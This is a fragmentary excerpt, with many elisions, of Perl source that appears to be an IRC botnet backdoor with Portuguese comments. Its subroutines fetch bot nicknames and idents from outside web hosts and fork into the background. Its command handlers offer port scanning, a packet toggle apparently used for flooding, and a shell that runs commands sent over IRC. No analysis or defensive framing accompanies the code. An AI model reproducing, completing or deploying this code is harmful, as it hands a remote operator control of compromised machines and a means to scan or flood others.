...
sub getnick {
  #my $retornonick = &_get("http://websturvey.burstmedia.com/names.txt");
  #return $retornonick;
  return "x0x".int(rand(1000));
}


sub getident {
  my $retornoident = &_get("http://www.mintpop.com/sk12pack/idents.php");
...
sub getname {
  my $retornoname = &_get("http://www.minptop.com/sk12pack/names.php");
  return $retornoname;
}
      ...
      if (fork) {
         exit;
           ...
           if ($funcarg =~ /^portscan (.*)/) {
            ...
            # Duas Versoes simplificada do meu Tr0x ;D
  ...
  my ($kem, $printl, $case) = @_;
   ...
   if ($case =~ /^join (.*)/) {
    ...
    my $novonick = getnick();
     ...
     if ($1 eq "on") {
      $estatisticas = 1;
      msg("$printl", "Estatisticas ativadas!");
     } elsif ($1 eq "off") {
      $estatisticas = 0;
      msg("$printl", "Estatisticas desativadas!");
     }
   }
   elsif ($case =~ /^pacotes (.*)/) {
     if ($1 eq "on") {
...
sub shell {
  ...
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "Diretorio inexistente!");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
